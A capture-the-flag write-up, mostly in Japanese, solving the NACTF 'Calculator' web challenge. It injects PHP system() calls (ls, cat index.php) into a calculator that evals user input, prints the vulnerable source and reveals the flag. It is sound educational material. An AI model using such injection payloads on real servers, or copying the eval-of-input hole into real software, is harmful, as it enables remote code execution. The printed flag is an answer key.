# Calculator:Web:150pts
Kevin has created a cool calculator that can perform almost any mathematical operation! It seems that he might have done this the lazy way though... He's also hidden a flag variable somewhere in the code.  
[https://calculator.challenges.nactf.com/](https://calculator.challenges.nactf.com/)  
Hint  
What's the easiest way to evaluate user input?  

# Solution
URLにアクセスすると計算機があるようだ。  
Calculator  
[site.png](site/site.png)  
1+2  
[calc1.png](site/calc1.png)  
evalを使っていることが予想される。  
system("ls -al")  
[calc2.png](site/calc2.png)  
index.phpを表示する。  
system("cat index.php")  
[calc3.png](site/calc3.png)  
一見すると無いようだが、ソースに表示されている。  
```html
~~~
    <title>Calculator</title>
</head>
<body class="black">
<h1 class="center red-text" style="padding-bottom: 75px">The Best and Most Secure Calculator Ever</h1>
<div class="container">
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- Compiled and minified CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">

    <title>Calculator</title>
</head>
<body class="black">
<h1 class="center red-text" style="padding-bottom: 75px">The Best and Most Secure Calculator Ever</h1>
<div class="container">
    <?php
    $flag = "nactf{ev1l_eval}";
    if (isset($_POST["input"])) {
        $input = $_POST["input"];
        echo '<div class="center white-text" style="padding-bottom: 50px"><h3>' . $input . " = " . eval("return ($input);") . '</h3></div>';
    }
    ?>
    <form action="index.php" method="post">
        <div class="input-field">
~~~
```
flagが得られた。  
$flagでも出るようだ…。  
$flag  
[calc4.png](site/calc4.png)  

## nactf{ev1l_eval}